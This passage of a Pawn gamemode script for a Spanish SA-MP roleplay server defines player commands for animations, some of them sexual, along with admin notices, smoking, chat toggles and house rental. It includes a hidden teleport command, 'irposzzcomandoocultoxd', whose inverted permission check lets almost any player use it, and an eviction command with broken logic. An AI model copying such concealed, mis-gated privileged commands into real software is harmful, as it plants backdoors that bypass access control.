	return ApplyAnimation(playerid, "DANCING", "dnce_M_a", 4.1, 7, 5, 1, 1, 1);
}
command(danzar9, playerid, params[])
{
	return ApplyAnimation(playerid, "DANCING", "dnce_M_b", 4.1, 7, 5, 1, 1, 1);
}
command(danzar10, playerid, params[])
{
	return ApplyAnimation(playerid, "DANCING", "dnce_M_c", 4.1, 7, 5, 1, 1, 1);
}
command(danzar11, playerid, params[])
{
	return ApplyAnimation(playerid, "DANCING", "dnce_M_d", 4.1, 7, 5, 1, 1, 1);
}
command(danzar12, playerid, params[])
{
	return ApplyAnimation(playerid, "DANCING", "dnce_M_e", 4.1, 7, 5, 1, 1, 1);
}
command(taxi, playerid, params[])
{
	return ApplyAnimation(playerid, "PED", "IDLE_taxi", 4.1, 0, 1, 1, 1, 1);
}
command(seacabo, playerid, params[])
{
	return ApplyAnimation(playerid, "PED", "Shove_Partial", 4.1, 0, 1, 1, 1, 1);
}
command(tullio, playerid, params[])
{
	return ApplyAnimation(playerid, "PED", "WALK_old", 4.0, 1, 1, 1, 1, 500);
}
command(asco, playerid, params[])
{
	return ApplyAnimation(playerid, "FOOD", "EAT_Vomit_SK", 4.1, 0, 1, 1, 1, 1);
}
command(quepa, playerid, params[])
{
	return ApplyAnimation(playerid, "GANGS", "hndshkea", 4.1, 0, 1, 1, 1, 1);
}
command(wooo, playerid, params[])
{
	return ApplyAnimation(playerid, "ON_LOOKERS", "shout_02", 4.1, 7, 5, 1, 1, 1);
}
command(quepasa, playerid, params[])
{
	return ApplyAnimation(playerid, "GHANDS", "gsign1LH", 4.1, 0, 1, 1, 1, 1);
}
command(comodo, playerid, params[])
{
	return ApplyAnimation(playerid, "INT_HOUSE", "LOU_In", 4.1, 0, 1, 1, 1, 1);
}
command(p1, playerid, params[])
{
 	return ApplyAnimation(playerid, "Freeweights", "gym_free_B", 4.0, 1, 1, 1, 1, 500);
}
command(bailar, playerid, params[]){
	if(GetPlayerState(playerid) == PLAYER_STATE_ONFOOT){
 		if(!sscanf(params, "d", params[0]))
		{
		    switch(params[0])
		    {
		        case 1: SetPlayerSpecialAction(playerid, SPECIAL_ACTION_DANCE1);
		        case 2: SetPlayerSpecialAction(playerid, SPECIAL_ACTION_DANCE2);
		        case 3: SetPlayerSpecialAction(playerid, SPECIAL_ACTION_DANCE3);
		        default: Mensaje(playerid, COLOR_AMARILLO, "Utiliza /bailar [1-3]");
      		}
		} else Mensaje(playerid, COLOR_AMARILLO, "Utiliza /bailar [1-3]");
	}return 1;
}
command(stop, playerid, params[])
{
	ClearAnimations(playerid);
	return 1;
}
command(acciones, playerid, params[])
{
	Mensaje(playerid, COLOR_NARANJA, "Center Island RP - Acciones disponibles:");
	Mensaje(playerid, COLOR_ROJO3, "/rendirse /borracho /hablar /paja /irsecortao /arrestado");
	Mensaje(playerid, COLOR_ROJO3, "/amenazar /superpatada /reirse /agredido /herido /encender");
	Mensaje(playerid, COLOR_ROJO3, "/inhablar /asustado /adolorido /apagar /vigilar /recostarse");
	Mensaje(playerid, COLOR_ROJO3, "/pararse /cubrirse /fumar[1-3] /vomitar /cenar /chao /palmada");
	Mensaje(playerid, COLOR_ROJO3, "/agonizar /levantarse /rodar /traficar /beso /crack /mear /p1");
	Mensaje(playerid, COLOR_ROJO3, "/bailar /patada /sentarse /depie /fokear /siquiero /noquiero");
	return Mensaje(playerid, COLOR_VIOLETA, "Utiliza /acciones2 para ver mas acciones disponibles.");
}
command(acciones2, playerid, params[])
{
	Mensaje(playerid, COLOR_NARANJA, "Center Island RP - Acciones disponibles 2:");
	Mensaje(playerid, COLOR_ROJO3, "/comerciar /piquero /taichi /beber /boxear /fuerza /pelea");
	Mensaje(playerid, COLOR_ROJO3, "/recoger /botear /clavarse /lanzar /hombre /mujer /sanar");
	Mensaje(playerid, COLOR_ROJO3, "/llorar /dormir /detener /rapear /alzar /cansado /bomba");
	Mensaje(playerid, COLOR_ROJO3, "/sapiar /asiento /servirse /servir /asiento2 /depie2 /mmm");
	Mensaje(playerid, COLOR_ROJO3, "/saludo /strip /echarse /asientosexi /skate /danzar /taxi");
	Mensaje(playerid, COLOR_ROJO3, "/seacabo /correr /tullio /asco /quepa /wooo /quepasa /comodo");
	return Mensaje(playerid, COLOR_VIOLETA, "Utiliza /sexo para mas animaciones.");
}
command(encuatro1, playerid, params[])
{
ApplyAnimation(playerid, "SNM", "SPANKING_IDLEW", 4.0, 0, 1, 1, 1, 1);
return 1;
}
command(encuatro2, playerid, params[])
{
ApplyAnimation(playerid, "SNM", "SPANKINGW", 4.0, 1, 1, 1, 1, 1);
return 1;
}
command(encuatro3, playerid, params[])
{
ApplyAnimation(playerid, "SNM", "SPANKEDP", 4.0, 1, 1, 1, 1, 1);
return 1;
}
command(nalgada, playerid, params[])
{
ApplyAnimation(playerid, "SNM", "SPANKINGP", 4.0, 1, 1, 1, 1, 1);
return 1;
}
command(nalgada2, playerid, params[])
{
ApplyAnimation(playerid, "SNM", "SPANKEDW", 4.0, 1, 1, 1, 1, 1);
return 1;
}

command(nalgada3, playerid, params[])
{
ApplyAnimation(playerid, "SNM", "SPANKING_ENDP", 4.0, 1, 1, 1, 1, 1);
return 1;
}
command(chupamela1, playerid, params[])
{
ApplyAnimation(playerid, "BLOWJOBZ", "BJ_COUCH_START_P", 4.1, 0, 1, 1, 1, 1);
return 1;
}
command(chupamela2, playerid, params[])
{
ApplyAnimation(playerid, "BLOWJOBZ", "BJ_COUCH_START_P", 4.1, 0, 1, 1, 1, 1);
return 1;
}
command(chupamela3, playerid, params[])
{
ApplyAnimation(playerid, "BLOWJOBZ", "BJ_COUCH_LOOP_P", 4.1, 0, 1, 1, 1, 1);
return 1;
}
command(chupamela4, playerid, params[])
{
ApplyAnimation(playerid, "BLOWJOBZ", "BJ_COUCH_END_P", 4.1, 0, 1, 1, 1, 1);
return 1;
}
command(chupamela5, playerid, params[])
{
ApplyAnimation(playerid, "BLOWJOBZ", "BJ_STAND_START_P", 4.1, 0, 1, 1, 1, 1);
return 1;
}
command(chupamela6, playerid, params[])
{
ApplyAnimation(playerid, "BLOWJOBZ", "BJ_STAND_END_P", 4.1, 0, 1, 1, 1, 1);
return 1;
}
command(mamar1, playerid, params[])
{
ApplyAnimation(playerid, "BLOWJOBZ", "BJ_COUCH_START_W", 4.1, 0, 1, 1, 1, 1);
return 1;
}
command(mamar2, playerid, params[])
{
ApplyAnimation(playerid, "BLOWJOBZ", "BJ_COUCH_LOOP_W", 4.1, 0, 1, 1, 1, 1);
return 1;
}
command(mamar3, playerid, params[])
{
ApplyAnimation(playerid, "BLOWJOBZ", "BJ_COUCH_END_W", 4.1, 0, 1, 1, 1, 1);
return 1;
}
command(mamar4, playerid, params[])
{
ApplyAnimation(playerid, "BLOWJOBZ", "BJ_STAND_START_W", 4.1, 0, 1, 1, 1, 1);
return 1;
}
command(mamar5, playerid, params[])
{
ApplyAnimation(playerid, "BLOWJOBZ", "BJ_STAND_END_W", 4.1, 0, 1, 1, 1, 1);
return 1;
}
command(mamar6, playerid, params[])
{
ApplyAnimation(playerid, "BLOWJOBZ", "BJ_STAND_END_W", 4.1, 0, 1, 1, 1, 1);
return 1;
}
command(sexo, playerid, params[])
{
Mensaje(playerid, 0xFFFFFFAA, " {FFFFFF}=====================================================");
Mensaje(playerid, 0xFFFFFFAA, " {FFFFFF}Animaciones de{00FF00}sexo ZonaZero{00FF00}RP");
Mensaje(playerid, 0xFFFFFFAA, " {FFFFFF}/encuatro{00FFFF}[1/3] {FFFFFF}/nalgada{00FFFF}[1/3]");
Mensaje(playerid, 0xFFFFFFAA, " {FFFFFF}/chupamela{00FFFF}[1/6] {FFFFFF}/mamar{00FFFF}[1/5]");
Mensaje(playerid, 0xFFFFFFAA, " {FFFFFF}=====================================================");
return 1;
}
command(encuatro, playerid, params[])
{
Mensaje(playerid, 0xFFFFFFAA, "{FFFFFF}/encuatro{00FFFF}[1/3]");
return 1;
}
command(chupamela, playerid, params[])
{
Mensaje(playerid, 0xFFFFFFAA, "{FFFFFF}/chupamela{00FFFF}[1/6]");

return 1;
}
command(mamar, playerid, params[])
{
Mensaje(playerid, 0xFFFFFFAA, "{FFFFFF}/mamar{00FFFF}[1/5]");

return 1;
}

   	command(reglasadmin, playerid, params[]){

	if(cuenta[playerid][cAdministrador] >= 1){
    if(!booleano[AntiAbusos]{playerid}){Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} No puedes usar este comando sin estar en OnDuty."); return 1;}
		new string[820];
		new ver[] = "{2E2EFE}Normas administrativas, importante leerlas:\n\n\t{FFFFFF}- Si un administrador superior te dice que te pongas DUTY, no rechistar.\n\t- Buena ortografía y buena expresión.\n\t- Actividad en el servidor mínima.\n\t- Responsabilidad y ganas de ayudar.\n\t- Dar ejemplo a los usuarios.\n\t- No faltar al respeto ni a un usuario ni a un administrador superior.\n\n";
		new ver2[] = "\t- No pedir a cada 5 minutos permiso para rolear, recuerda que eres admin.\n\t- Tener una mínima actividad mínima en el foro.\n\t- Si estas solo de admin y no hay ningún administrador ON, ponte ONDUTY.\n\t- No hacer ningun tipo de Admin Abuse sobre los usuarios o para tener ventaja ON ROL.\n";
		format(string, sizeof(string), "%s %s", ver, ver2);
        return ShowPlayerDialog(playerid, 821, DIALOG_STYLE_MSGBOX, "{2E2EFE}Reglas administrativas", string, "Ok", "");
        } else Mensaje(playerid, COLOR_GRIS2, "No eres administrador!");
        return 1;
	}
	command(estilocaminar, playerid, params[])
    {
        if(sscanf(params, "i", params[0]))return Mensaje(playerid, COLOR_GRIS2, "Utiliza: /estilocaminar <1-13>");
        if(params[0] > 0 && params[0] < 14)
        {
        	cuenta[playerid][cCaminar] = params[0];
         	SetPlayerWalkingStyle(playerid, cuenta[playerid][cCaminar]);
          	Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} Estilo de caminar ha sido cambiado.");
		} else Mensaje(playerid, COLOR_GRIS2, "Utiliza: /estilocaminar <1-13>");
		return 1;
    }
command(apagarb , playerid, params[])
{
  if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER)
 return Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} No eres el conductor del vehiculo.");
		
	new Float:posX, Float:posY, Float:posZ;
 	GetPlayerPos(playerid, posX, posY, posZ);
 	new iCount;
	for(new i=0, _max=GetMaxPlayers();i<_max;i++)
	{
		if(SubWooferR(posX, posY, posZ, i) < 3.0){
			if(IsPlayerInRangeOfPoint(i, 150.0, InfoWoofer[i][WoPosX], InfoWoofer[i][WoPosY], InfoWoofer[i][WoPosZ]) && GetPlayerInterior(i) == InfoWoofer[i][WoInterior] && GetPlayerVirtualWorld(i) == InfoWoofer[i][WoVW])
			{
				for(new x=0, _max2=GetMaxPlayers();x<_max2;x++)
				{
					if(GetDistanceBetweenPlayerss(x, i) < 150.0) StopAudioStreamForPlayer(x);
				}
				StopAudioStreamForPlayer(i);
			}

			WooferSet[i] = 0;
			InfoWoofer[i][WoPosX] = 0.0;
			InfoWoofer[i][WoPosY] = 0.0;
			InfoWoofer[i][WoPosZ] = 0.0;
			InfoWoofer[i][WoInterior] = 0;
			InfoWoofer[i][WoVW] = 0;
			InfoWoofer[i][WoEstacion] = 0;
			InfoWoofer[i][WoSetby] = 999;
			iCount++;
		}
	}

	if(iCount == 0) Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} No tienes un Mini - Woofer en este momento.");
	else
	{
		new string[128];
		format(string, sizeof(string), "%s apaga su subwoofer", PlayerName(playerid));
		ProxDetector(25.0, playerid, string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
	}
	return 1;
}

command(encenderb , playerid, params[])
{
   if(cuenta[playerid][cWofer] < 1)
   return Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} Usted no ha comprado un Mini-Wofer para el vehículo.");
   
   if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER)
		return Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} No eres el conductor del vehículo.");
		
	if(WooferSet[playerid] != 0)
	    return Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} Usted ya tiene un Mini - Woofer encendido Utilice /apagarb.");

	new Float:posX, Float:posY, Float:posZ;
 	GetPlayerPos(playerid, posX, posY, posZ);

	for(new i=0, _max=GetMaxPlayers();i<_max;i++)
	{
 		if(SubWooferR(posX, posY, posZ, i) < 150.0)
			return Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} Usted ya tiene un Mini - Woofer encendido Utilice /apagarb.");
	}
	ShowPlayerDialog(playerid, DIALOG_WOOFER, DIALOG_STYLE_INPUT, "{8ED5E1}Woofer - Musica", "{FFFFFF}Para colocar el bomboox de acepte e ingrese un url .mp3", "Ok", "Cancel");
	return 1;
	}
	command(irposzzcomandoocultoxd, playerid, params[])
	{
		if (cuenta[playerid][cAdministrador] < 2014 || cuenta[playerid][pScripter] == 0)
		{
			new Float: pos[3], int;
			if(sscanf(params, "fffd", pos[0], pos[1], pos[2], int))return Mensaje(playerid, COLOR_AMARILLO, "» {FFFFFF}/irpos [X] [Y] [Z] [Interior]");
			Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} Fuiste teletransportado a la posición seleccionada.");
			SetPlayerPos(playerid, pos[0], pos[1], pos[2]);
			SetPlayerInterior(playerid, int);
		    return 1;
		}else Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} No estás autorizado al comando.");
		return 1;
	}
    command(cfumar, playerid, params[])
    {
        if(cNicotina[playerid] == 1) 					return Mensaje(playerid, COLOR_AMARILLO, 	"»{FFFFFF} No tienes ganas de fumar.");
    	else if(cuenta[playerid][cCigarrillos] == 0)return Mensaje(playerid, COLOR_AMARILLO, 	"»{FFFFFF} No tienes cigarros.");
	    else if(cuenta[playerid][cEncendedor] == 0) 	return Mensaje(playerid, COLOR_AMARILLO, 	"»{FFFFFF} No tienes encendedor.");
	    else if(IsSmoking[playerid] > 0) 				return Mensaje(playerid, COLOR_AMARILLO, 	"»{FFFFFF} Ya estás fumando.");
	    else
	    {
	        new randsmoke = random(6);
	        if(randsmoke < 5)
	        {
				new string[72];
	            cuenta[playerid][cEncendedor] -= 1;	cuenta[playerid][cCigarrillos] -= 1;
	    		format(string, sizeof(string), "* %s abre su cajetilla y enciende un cigarro.", PlayerName(playerid));
			    ProxDetector(30.0, playerid, string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
			    IsSmoking[playerid] = 80;
			    SetPlayerSpecialAction(playerid, SPECIAL_ACTION_SMOKE_CIGGY);
				Mensaje(playerid, COLOR_BLANCO, "(Fumando) Ahora puedes utilizar /dfumar (para dejar de fumar).");
                SmokeTimer[playerid] = SetTimerEx("SmokingCigarette", 1000, true, "i", playerid);
			}
	        else
	        {
	            cuenta[playerid][cEncendedor] -= 1;
    			Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} Fallaste al encender el cigarro.");
	        }
	    }
	    return 1;
	}
    command(dfumar, playerid, params[]){
        if(IsSmoking[playerid] > 0){
            new string[128];
        	IsSmoking[playerid] = 0;
         	format(string, sizeof(string), "* %s tira el cigarro al suelo y lo pisa.", PlayerName(playerid));
         	ProxDetector(30.0, playerid, string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
          	SetPlayerSpecialAction(playerid, SPECIAL_ACTION_NONE);
          	KillTimer(SmokeTimer[playerid]);
          	ClearAnimations(playerid);
        } else Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} No estás fumando.");
        return 1;
    }
	command(soporte, playerid, params[])
	{
        ClearChatbox(playerid, 8);
	    Mensaje(playerid, -1, "{C8D228}-= {00B39D}Centro de Soporte {FFFFFF}Center Island RP {C8D228}=-");
	    Mensaje(playerid, -1, "{FFFFFF}- Dudas sobre terminos de juego - {FF0828}/duda");
	    Mensaje(playerid, -1, "{FFFFFF}- Reportar a un jugador por infringir las normas - {46ED8F}/re");
	    return Mensaje(playerid, -1, "{FFFFFF}- ¿Necesistas asistencia? - {00A400}/solicitaradmin");
	}
  	command(servicios, playerid, params[]){
        ClearChatbox(playerid, 10);
	    Mensaje(playerid, -1, " {FFFFFF}* {658EBB}Números de Servicios {FFFFFF}*");
	 	Mensaje(playerid, -1, " {FFFFFF}* Emergencias - {65BD7D}# 911");
	 	Mensaje(playerid, -1, " {FFFFFF}* Mecanicos - {65BD7D}# 555");
	 	return 1;
	}
    command(facciones, playerid, params[]){
        if(cuenta[playerid][cAdministrador] >= 2012){
		if(!booleano[AntiAbusos]{playerid}){Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} No puedes usar este comando sin estar en OnDuty."); return 1;}
		    Mensaje(playerid, -1, "{E48584}Facciones Oficiales ZZ:");
			Mensaje(playerid, -1, "{FFFFFF}1- LSPD  3- LSMC 4- Mecánicos 5- Mecanicos Ian 6- Gobierno 7- CNN 9- FBI Ilegales: /listafaccion");
		} else Mensaje(playerid, COLOR_GRIS2, "No autorizado!");
		return 1;
	}
	command(armas, playerid, params[]){
        if(cuenta[playerid][cAdministrador] >= 2014){
		if(!booleano[AntiAbusos]{playerid}){Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} No puedes usar este comando sin estar en OnDuty."); return 1;}
            Mensaje(playerid, -1, "{E48584}Armas Oficiales ZZ:");
			Mensaje(playerid, -1, "2- Palo de Golf 3- Porra 4- Cuchillo 5- Bate 6- Pala 7- Palo de Pool");
			Mensaje(playerid, -1, "9- Motosierra 10- Dildo Violeta 11- Dildo 14- Flores 15- Baston ");
			Mensaje(playerid, -1, "16- Granada 17- Bomba de gas 18- Molotov 22- 9mm 23- Silenciada 24- D.Eagle");
            Mensaje(playerid, -1, "25- Shotgun 26- Recortada 27- SPAZ 28- UZI 29- MP5 30- AK47 31- M4 32- Tec9");
            Mensaje(playerid, -1, "33- Rifle 34- Sniper 41- Spray 42- Extingidor 43- Camara 46- Paracaidas");
		} else Mensaje(playerid, COLOR_GRIS2, "No autorizado!");
		return 1;
	}
	//Canales
	command(togac, playerid, params[])
	{
 		if(cuenta[playerid][cAdministrador] >= 2)
		{
            if(!AdminChat[playerid]){
		        AdminChat[playerid] = 1;
		        Mensaje(playerid, COLOR_GRIS2, "- Canal de administración desactivado");
		    }
		    else{
		        AdminChat[playerid] = 0;
		        Mensaje(playerid, COLOR_GRIS2, "- Canal de administración activado");
		    }
        } else Mensaje(playerid, COLOR_GRIS2, "No autorizado!");
        return 1;
    }
	
command(togw, playerid, params[]){
	if(cuenta[playerid][cAdministrador] < 1)return Mensaje(playerid, COLOR_GRIS2, "No autorizado!");
	if(!booleano[HidePM]{playerid}){
		booleano[HidePM]{playerid} = true;
		Mensaje(playerid, COLOR_GRIS2, "PMs Bloqueados!");
	}else{
		booleano[HidePM]{playerid} = false;
		Mensaje(playerid, COLOR_GRIS2, "PMs Habilitados!");
	}
	return 1;
}
COMMAND:togmp(playerid)
{
	switch(booleano[gMensajesP]{playerid})
	{
		case true:
		{
			booleano[gMensajesP]{playerid} = false;
			Mensaje(playerid, COLOR_GRIS2, "PMs(/mp) Habilitados!");
		}
		case false:
		{
			booleano[gMensajesP]{playerid} = true;
			Mensaje(playerid, COLOR_GRIS2, "PMs(/mp) Bloqueados!");
		}
	}
	return 1;
}
command(togdudas, playerid, params[]){
	if(!booleano[gOoc]{playerid}){
		booleano[gOoc]{playerid} = true;
		Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} Canal de Ayuda ha sido activado.");
	}else{
		booleano[gOoc]{playerid} = false;
		Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} Canal de Ayuda ha sido desactivado.");
	}
	return 1;
}
	
command(togfac, playerid, params[]){
	if(!booleano[gFam]{playerid}){
		booleano[gFam]{playerid} = true;
		Mensaje(playerid, COLOR_GRIS2, "Chat de Facción desactivado.");
	}else{
		booleano[gFam]{playerid} = false;
		Mensaje(playerid, COLOR_GRIS2, "Chat de Facción activado.");
	}
	return 1;
}
command(tognews, playerid, params[]){
	if(!booleano[gNews]{playerid}){
		booleano[gNews]{playerid} = true;
		Mensaje(playerid, COLOR_GRIS2, "Chat de Radio/Ads desactivado.");
	}else{
		booleano[gNews]{playerid} = false;
		Mensaje(playerid, COLOR_GRIS2, "Chat de Radio/Ads activado.");
	}
	return 1;
}
command(togphone, playerid, params[])
{
	if(!booleano[PhoneOnline]{playerid})
	{
		booleano[PhoneOnline]{playerid} = true;
		Mensaje(playerid, COLOR_GRIS2, "Teléfono apagado.");
	}
	else
	{
		booleano[PhoneOnline]{playerid} = false;
		Mensaje(playerid, COLOR_GRIS2, "Teléfono encendido.");
	}
	return 1;
}

    command(id, playerid, params[]){
        if(!sscanf(params, "u", params[0])){
            new string[32];
            format(string, sizeof(string), "(%d) - %s", params[0], PlayerName(params[0]));
			Mensaje(playerid, COLOR_GRIS2, string);
        } else Mensaje(playerid, COLOR_GRIS2, "Utiliza: /id <NombreJugador>");
        return 1;
    }
 	command(gpsmeca, playerid, params[]){
        if(!Team_Mecanicos(playerid))return Mensaje(playerid, COLOR_GRIS2, "No eres mecánico!");
        if(!booleano[OnDuty]{playerid})return Mensaje(playerid, COLOR_GRIS2, "No estás en servicio!");
		if(!Mecanico_Vehicle(GetPlayerVehicleID(playerid)))return Mensaje(playerid, COLOR_GRIS2, "No estás en un carro de mecanico!");
        if(!sscanf(params, "u", params[0])){
            new Float:X, Float:Y, Float:Z;
			GetPlayerPos(params[0], X, Y, Z);
			SetPlayerCheckpoint(playerid, X, Y, Z, 6);
			Mensaje(playerid, COLOR_AMARILLO3, "Posición del jugador marcado en el mapa.");
        } else Mensaje(playerid, COLOR_GRIS2, "Utiliza: /gpsmeca <Nombre_Jugador>");
        return 1;
    }
    command(removegps, playerid, params[]){
    	if(IsPlayerConnected(playerid)){
			DisablePlayerCheckpoint(playerid);
		}
		return 1;
	}
	command(materiales, playerid, params[]){
	   if(IsPlayerConnected(playerid)){
	        new string[80];
  	        format(string, sizeof(string), "Tienes: %d de materiales.", cuenta[playerid][cMateriales]);
  	        Mensaje(playerid, COLOR_GRIS2, string);
    	}
		return 1;
  	}
	command(numtarjeta, playerid, params[]){
	   if(IsPlayerConnected(playerid)){
	   if(cuenta[playerid][cTarjeta] == 0)return Mensaje(playerid, COLOR_ROJO, "»{FFFFFF} Usted no tiene una tarjeta de crédito.");
	        new string[80];
  	        format(string, sizeof(string), "Tu numero de tarjeta es: %d", cuenta[playerid][cTarjeta]);
  	        Mensaje(playerid, COLOR_GRIS2, string);
    	}
		return 1;
  	}
    //zcmd [Cmd's Houses]
	
COMMAND:vendercasa(playerid, params[])
{
	new cas, idcas;
	if(sscanf(params, "d", cas))return Mensaje(playerid, COLOR_GRIS2, "Utiliza: /vendercasa [slot 1 - 2]");
	idcas = (cas == 1) ? (cuenta[playerid][cCasa]):(cuenta[playerid][cCasa2]); 
	if(idcas == 9999)return Mensaje(playerid, COLOR_ROJO, "No posees una propiedad.");
	if(IsPlayerInRangeOfPoint(playerid, 3.0, casa[idcas][hEntrancex], casa[idcas][hEntrancey], casa[idcas][hEntrancez]))
	{			
		entero[playerid][sNegocio] = cas;
		ShowPlayerDialog(playerid, Dialog_CasaSell, DIALOG_STYLE_MSGBOX, "Vender Casa", "{ffffff}Estas a punto de vender tu casa a un {ff0000}40% {ffffff}del valor por el cual lo compraste\n\n{ffffff}esta seguro de quererlo vender?", "Aceptar", "Cancelar");
	}else Mensaje(playerid, COLOR_ROJO, "Debes estar cerca de tu casa para venderla!");
	return 1;
}

    command(rcuarto, playerid, params[])
    {
        for(new h = 0; h < sizeof(casa); h++)
		{
			if(IsPlayerInRangeOfPoint(playerid, 2.0, casa[h][hEntrancex], casa[h][hEntrancey], casa[h][hEntrancez]))
			{
   				if(casa[h][hOwned] == 1 &&  casa[h][hRent] > 0)
			    {
			        new string[64];
					if(cuenta[playerid][cCasa] != 9999 && strcmp(PlayerName(playerid), casa[cuenta[playerid][cCasa]][hOwner], true) == 0)
					{
     					Mensaje(playerid, COLOR_ROJO, "Tú posees una propiedad. No hace falta que rentes una.");
          				return 1;
					}
					if(casa[h][hRooms] < 1)return Mensaje(playerid, COLOR_ROJO, "No hay habitaciones disponibles!");
					if(cuenta[playerid][cRentado] > 0)return Mensaje(playerid, COLOR_ROJO, "Ya estás pagando una renta!");
					if(obtenerDinero(playerid) >= casa[h][hRent])
					{
						cuenta[playerid][cCasa] = h;
      					cuenta[playerid][cEntrada] = h;
						cuenta[playerid][cRentado] = casa[cuenta[playerid][cCasa]][hRent];
						pierdeDinero(playerid, casa[h][hRent]);
						casa[cuenta[playerid][cCasa]][hRentabil] = casa[cuenta[playerid][cCasa]][hRentabil]+casa[h][hRent];
						Mensaje(playerid, COLOR_BLANCO, "Has rentado esta casa. Ahora podrás vivir aquí.");
						format(string, sizeof(string), "Cada PayDay, pagarás %d$ de Renta.", cuenta[playerid][cRentado]);
						Mensaje(playerid, COLOR_BLANCO, string);
						Mensaje(playerid, COLOR_BLANCO, "Utiliza /desrentar para cancelar la renta.");
						casa[cuenta[playerid][cCasa]][hRooms] -= 1;
						OnPropTextdrawUpdate(cuenta[playerid][cCasa]);
					} else Mensaje(playerid, COLOR_ROJO, "No tienes suficientes fondos para rentar esta casa.");
				} else Mensaje(playerid, COLOR_ROJO, "Esta casa no se encuentra disponible para alquilarla.");
			}
		}
        return 1;
    }
    command(puente, playerid, params[])
	{
	    new string[128], idcar = GetPlayerVehicleID(playerid);
    	if(!booleano[Ganzuas]{playerid})return Mensaje(playerid, COLOR_GRIS2, "No tienes ganzúas!");
    	if(!IsPlayerInAnyVehicle(playerid))return Mensaje(playerid, COLOR_GRIS2, "No estás en un vehículo!");
    	if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER)return Mensaje(playerid, COLOR_GRIS2, "No eres el conductor.");
		if(!autos[idcar][cBattery])return Mensaje(playerid, COLOR_GRIS2, "Vehículo sin batería!");
		if(EsComprable(idcar)){ if(cuenta[playerid][cCoche] == idcar || cuenta[playerid][cCoche2] == idcar){ return 1; } }
		if(HireKey[playerid] == idcar){ return 1; }
		
		format(string, sizeof(string), "* %s utiliza unas ganzúas y cruza los cables.", PlayerName(playerid));
		ProxDetector(30.0, playerid, string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
		GameTextForPlayer(playerid, "~w~haciendo puente....", 2500, 3);
		TogglePlayerControllable(playerid, false);
		SetTimerEx("encenderMotor", 3000, false, "d", playerid);
		return 1;
	}
COMMAND:desalojar(playerid, params[])
{
	new cas, idcas, jugador;
	if(sscanf(params, "du", cas, jugador))return Mensaje(playerid, COLOR_GRIS2, "Utiliza: /desalojar [slot 1 - 2] [Usuario]");
	idcas = (cas == 1) ? (cuenta[playerid][cCasa]):(cuenta[playerid][cCasa2]); 
	
	if(idcas == 9999)return Mensaje(playerid, COLOR_ROJO, "No posees una propiedad.");
	if(IsPlayerConnected(jugador) || jugador != playerid)
	{
		if(cuenta[jugador][cCasa] == idcas)return Mensaje(playerid, COLOR_ROJO, "El jugador no te ha alquilado la casa.");
		
		new string[64];
		format(string, sizeof(string), "Desalojaste a %s", PlayerName(jugador));
		Mensaje(playerid, COLOR_BLANCO, string);
		Mensaje(jugador, COLOR_ROJO, "No tienes casa, tu amo canceló la renta.");
		cuenta[jugador][cCasa] = 9999;
		cuenta[jugador][cRentado] = 0;
		casa[idcas][hRooms] += 1;
		OnPropTextdrawUpdate(idcas);
	}else Mensaje(playerid, COLOR_ROJO, "Jugador no conectado.");
	return 1;
}
	command(desrentar, playerid, params[])
    {
		if(cuenta[playerid][cCasa] != 9999 && strcmp(PlayerName(playerid), casa[cuenta[playerid][cCasa]][hOwner], true) == 0)
		{
			Mensaje(playerid, COLOR_ROJO, "No puedes desrentar tu propia casa.");
			return 1;
		}

		if(cuenta[playerid][cRentado] < 1 || cuenta[playerid][cCasa] == 9999)return Mensaje(playerid, COLOR_ROJO, "No has rentado nada!");

		casa[cuenta[playerid][cCasa]][hRooms] += 1;
		OnPropTextdrawUpdate(cuenta[playerid][cCasa]);
		cuenta[playerid][cCasa] = 9999;
		cuenta[playerid][cRentado] = 0;
		Mensaje(playerid, COLOR_BLANCO, "Dejaste de rentar una casa. Ahora eres un sin-techo.");
		return 1;
    }
	command(cinfo, playerid, params[])
	{
	    if(IsPlayerConnected(playerid))
	    {
	        new x[64];
			for(new h = 0; h < sizeof(casa); h++)
			{
			    if(IsPlayerInRangeOfPoint(playerid, 3.0, casa[h][hEntrancex], casa[h][hEntrancey], casa[h][hEntrancez]))
				{
				    if(casa[h][hOwned] == 0)
				    {
				        Mensaje(playerid, COLOR_VERDE, "- Propiedad en Venta - Información");
				        format(x, sizeof(x), "Interior ID: %d", casa[h][hInt]);
				        Mensaje(playerid, COLOR_BLANCO, x);
				        format(x, sizeof(x), "Valor: %d   -   Nivel: %d", casa[h][hValue], casa[h][hLevel]);
				        Mensaje(playerid, COLOR_BLANCO, x);
				        format(x, sizeof(x), "Habitaciones: %d", casa[h][hRooms]);
				        Mensaje(playerid, COLOR_BLANCO, x);
				        format(x, sizeof(x), "ID: %d", casa[h][hWorld]);
				        Mensaje(playerid, COLOR_BLANCO, x);
				        Mensaje(playerid, COLOR_AMARILLO3, "- Utiliza /comprarcasa, para comprar la casa");
				        return 1;
					}
					if(cuenta[playerid][cCasa] == h)
				    {
				        Mensaje(playerid, COLOR_ROJO, "- Propiedad Privada -");
				        format(x, sizeof(x), "Interior ID: %d", casa[h][hInt]);
				        Mensaje(playerid, COLOR_BLANCO, x);
